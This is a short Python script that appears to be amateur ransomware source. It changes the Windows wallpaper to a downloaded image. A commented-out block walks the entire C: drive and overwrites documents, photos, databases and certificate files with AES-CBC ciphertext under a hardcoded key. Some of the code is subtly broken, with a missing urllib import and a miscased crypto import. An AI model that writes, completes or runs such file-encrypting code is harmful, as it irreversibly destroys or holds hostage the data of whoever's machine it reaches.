#!/usr/bin/python

import os, fnmatch, ctypes
from Crypto import Random
from crypto.cipher import AES

try:
	homedir = os.path.expanduser('~')

	f = open(homedir + "\\image.bmp", "rb+")
	f.write(urllib.urlopen("http://www.ece.rice.edu/~wakin/images/lena512.bmp").read())
	f.close()

	SPI_SETDESKWALLPAPER = 20
	ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, f.name, 0)
	
except:
	pass

'''
key = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'
filetypes = ("*.odt","*.ods","*.odp","*.odm","*.odb","*.doc","*.doc","*.doc","*.wps","*.xls","*.xls","*.xls","*.xls","*.xlk","*.ppt","*.ppt","*.ppt","*.mdb","*.acc","*.pst","*.dwg","*.dxf","*.dxg","*.wpd","*.rtf","*.wb","*.mdf","*.dbf","*.psd","*.pdd","*.eps","*.ai","*.ind","*.cdr","*.jpg","*.dng","*.arw","*.srf","*.sr","*.bay","*.crw","*.cr","*.dcr","*.kdc","*.erf","*.mef","*.mrw","*.nef","*.nrw","*.orf","*.raf","*.raw","*.rwl","*.rw","*.ptx","*.pef","*.srw","*.der","*.cer","*.crt","*.pem","*.pfx","*.pdf","*.odc")
filelist = []

for root, dirnames, filenames in os.walk("C:\\"):
	for ft in filetypes:
		for f in fnmatch.filter(filenames, ft):
			filelist.append(os.path.join(root, f))

for filename in filelist:
	with open(filename, 'rb+') as f:
		plaintext = f.read()

		#Pad out the input
		plaintext = plaintext + b"\0" * (AES.block_size - len(plaintext) % AES.block_size)
		iv = Random.new().read(AES.block_size)
		cipher = AES.new(key, AES.MODE_CBC, iv)
		ciphertext = iv + cipher.encrypt(plaintext)
	
		f.seek(0)
		f.write(ciphertext)
		f.truncate()
		f.close()
'''
